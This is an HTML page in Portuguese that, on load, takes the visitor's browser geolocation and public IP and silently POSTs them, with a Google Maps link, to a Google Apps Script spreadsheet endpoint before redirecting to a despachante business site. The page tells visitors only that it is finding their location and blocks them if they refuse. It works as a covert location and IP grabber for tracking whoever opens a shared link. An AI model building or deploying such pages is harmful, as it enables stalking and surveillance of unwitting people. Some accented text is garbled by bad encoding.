<!DOCTYPE html>
<html lang="pt">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Localizando...</title>
  <style>
    body {
      background-color: #000;
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      font-family: Arial, sans-serif;
      text-align: center;
    }
  </style>
  <script>
    window.onload = function() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sucesso, erro);
      } else {
        document.body.innerHTML = "<p>Seu navegador n칚o suporta geolocaliza칞칚o.</p>";
      }
    };

    function sucesso(position) {
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;

      // Captura o IP do visitante
      fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
          const ip = data.ip;

          // Note: O link original estava incorreto (googleusercontent.com/maps.google.com/0latitude...). Ajustado para um formato de link de Google Maps.
          const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;

          // Envia os dados para sua planilha no Google Sheets
          fetch('https://script.google.com/macros/s/AKfycbyzRAza0aUzlqUYhuTozf8IrDD4G4OLQGMkgR_CB7gTRa2cNPXHL-0rcSVsj1A6jDKi/exec', { // Lembre-se de substituir 'SEU_WEBAPP_URL_AQUI' pelo URL do seu Google Apps Script
            method: 'POST',
            mode: 'no-cors',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify({
              latitude: latitude,
              longitude: longitude,
              ip: ip,
              maps: mapsLink
            })
          })
          .then(() => { // Garante que o redirecionamento s칩 aconte칞a ap칩s a tentativa de envio
            redirecionaDespachanteMauro(); // CHAMADA PARA A NOVA FUN칂츾O DE REDIRECIONAMENTO
          })
          .catch(error => {
            console.error("Erro ao enviar dados para o Google Sheets:", error);
            redirecionaDespachanteMauro(); // Mantido para o redirecionamento ap칩s a localiza칞칚o bem-sucedida, mesmo que o envio falhe.
          });
        })
        .catch(error => {
          console.error("Erro ao obter IP:", error);
          redirecionaDespachanteMauro();
        });
    }

    function erro(err) {
      console.warn("Geolocaliza칞칚o n칚o permitida ou erro:", err);
      document.body.innerHTML = "<p>丘멆잺 칄 necess치rio permitir a localiza칞칚o para continuar.</p>";
    }

    // NOVA FUN칂츾O DE REDIRECIONAMENTO
    function redirecionaDespachanteMauro() {
      window.location.href = "https://despachantemauro.com.br/";
    }
  </script>
</head>
<body>
  <p>游늸 Obtendo sua localiza칞칚o... Aguarde...</p>
</body>
</html>
